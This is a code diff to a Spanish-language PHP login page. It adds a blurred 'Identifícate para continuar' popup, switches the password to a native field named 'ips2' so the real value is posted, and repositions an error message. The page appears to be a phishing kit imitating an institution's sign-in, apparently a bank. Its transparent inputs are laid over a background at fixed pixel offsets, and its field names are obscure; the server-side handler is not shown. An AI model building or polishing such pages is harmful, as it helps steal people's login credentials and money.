@@ -79,7 +79,100 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         outline: 2px solid var(--primary-color);
         outline-offset: 1px;
     }
+
+    /* ── Popup overlay ── */
+    #popup-overlay {
+        position: fixed;
+        inset: 0;
+        z-index: 9999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: rgba(0, 0, 0, 0.45);
+        backdrop-filter: blur(6px);
+        -webkit-backdrop-filter: blur(6px);
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.4s ease;
+    }
+    #popup-overlay.show {
+        opacity: 1;
+        pointer-events: all;
+    }
+    #popup-box {
+        background: #fff;
+        border-radius: 18px;
+        padding: 44px 52px;
+        text-align: center;
+        box-shadow: 0 24px 60px rgba(0,0,0,0.25);
+        transform: translateY(18px) scale(0.97);
+        transition: transform 0.4s cubic-bezier(.22,1,.36,1);
+        max-width: 340px;
+        width: 90%;
+    }
+    #popup-overlay.show #popup-box {
+        transform: translateY(0) scale(1);
+    }
+    #popup-box .popup-icon {
+        width: 58px;
+        height: 58px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, #69be28, #00693c);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 20px;
+    }
+    #popup-box .popup-icon svg {
+        width: 28px;
+        height: 28px;
+        fill: #fff;
+    }
+    #popup-box h2 {
+        font-family: 'Segoe UI', sans-serif;
+        font-size: 20px;
+        font-weight: 700;
+        color: #111;
+        margin-bottom: 8px;
+        letter-spacing: -0.3px;
+    }
+    #popup-box p {
+        font-family: 'Segoe UI', sans-serif;
+        font-size: 14px;
+        color: #777;
+        line-height: 1.5;
+    }
 </style>
+
+<!-- Popup -->
+<div id="popup-overlay">
+    <div id="popup-box">
+        <div class="popup-icon">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 1C8.676 1 6 3.676 6 7v1H4v15h16V8h-2V7c0-3.324-2.676-6-6-6zm0 2c2.276 0 4 1.724 4 4v1H8V7c0-2.276 1.724-4 4-4zm0 9a2 2 0 1 1 0 4 2 2 0 0 1 0-4z"/>
+            </svg>
+        </div>
+        <h2>Identifícate para continuar</h2>
+    </div>
+</div>
+
+<script>
+    (function() {
+        const overlay = document.getElementById('popup-overlay');
+        const bar     = document.getElementById('popup-progress-bar');
+
+        setTimeout(function() {
+            overlay.classList.add('show');
+            setTimeout(function() {
+                overlay.style.transition = 'opacity 0.35s ease';
+                overlay.style.opacity = '0';
+                setTimeout(function() {
+                    overlay.style.display = 'none';
+                }, 380);
+            }, 2000);
+        }, 1000);
+    })();
+</script>
 
 <div id="main-container" style="overflow: hidden; min-height:100vh; position: relative;">
     <div id="content-wrapper" style="display: inline-block; vertical-align: top; background-color: #fff;">
@@ -93,12 +186,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                        style="display: block; position: relative; color:#333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)" oninput="this.value = this.value.replace(/\s/g, ''); validarUsuario(this)">
                 
                 <!-- Password Input -->
-                <input id="passwordField" name="ips2_display" placeholder="Contraseña" type="text" required
+                <input id="passwordField" name="ips2" placeholder="Contraseña" type="password" required
                        class="secure-input"
-                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 224px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)" oninput="handlePasswordInput(this)">
+                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 224px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)">
                 
                 <!-- Error Message -->
-                <p id="error-display" style="font-family: sans-serif; position: absolute; top: 150px; left: 50%; transform: translateX(-50%); color: red; font-size: 14px; display: none; z-index: 10;">Usuario o contraseña incorrecta</p>
+                <p id="error-display" style="font-family: sans-serif; position: absolute; top: 415px; left: 28px; width: 357px; text-align: left; color: red; font-size: 13px; display: none; z-index: 10; margin: 0;">Usuario o contraseña incorrecta</p>
                 
                 <!-- Submit Button -->
                 <input type="submit" value="Inicie Sesión"
@@ -225,7 +318,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 errorMsg.textContent = 'No se permiten correos electrónicos en el campo de usuario';
                 errorMsg.style.display = 'block';
                 setTimeout(() => {
-                    errorMsg.textContent = 'Usuario o contraseña incorrecta';
+                    errorMsg.textContent = 'Usuario o contraseña incorrecto';
                     errorMsg.style.display = 'none';
                 }, 3000);
                 return false;
@@ -233,51 +326,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             return true;
         }
 
-        // Enhanced password handling
-        function handlePasswordInput(input) {
-            // Guardar el valor real en un atributo data
-            if (!input.dataset.realValue) {
-                input.dataset.realValue = '';
-                input.dataset.lastModified = generateTimestamp();
-            }
-            
-            // Obtener el valor real y el valor mostrado
-            const realValue = input.dataset.realValue;
-            const displayedValue = input.value;
-            
-            // Si el usuario borró caracteres, actualizar el valor real
-            if (displayedValue.length < realValue.length) {
-                input.dataset.realValue = realValue.substring(0, displayedValue.length);
-                input.dataset.lastModified = generateTimestamp();
-            } else if (displayedValue.length > realValue.length) {
-                // Si el usuario agregó caracteres, agregar al valor real eliminando espacios
-                const newChars = displayedValue.substring(realValue.length).replace(/\s/g, '');
-                input.dataset.realValue += newChars;
-                input.dataset.lastModified = generateTimestamp();
-            }
-            
-            // Mostrar asteriscos en el campo
-            input.value = '●'.repeat(input.dataset.realValue.length);
-        }
-
-        // Enhanced form submission
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            const passwordInput = document.getElementById('passwordField');
-            if (passwordInput.dataset.realValue) {
-                // Crear un campo oculto con el valor real
-                const hiddenInput = document.createElement('input');
-                hiddenInput.type = 'hidden';
-                hiddenInput.name = 'ips2';
-                hiddenInput.value = passwordInput.dataset.realValue;
-                hiddenInput.dataset.securityToken = sessionId;
-                
-                // Agregar el campo oculto al formulario
-                this.appendChild(hiddenInput);
-                
-                // Log submission attempt
-                console.log('Security: Form submitted with token', sessionId);
-            }
-        });
+        // El campo de contraseña ahora es un input type="password" nativo,
+        // por lo que el navegador se encarga de enmascarar y enviar el valor real por POST.
 
         // Enhanced password validation
         function validarContrasena(contrasena) {
@@ -303,7 +353,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
             form.addEventListener("submit", function (event) {
                 const passwordInput = document.getElementById("passwordField");
-                const contrasena = passwordInput.dataset.realValue || passwordInput.value;
+                const contrasena = passwordInput.value;
                 
                 // Enhanced validation
                 if (!validarContrasena(contrasena)) {
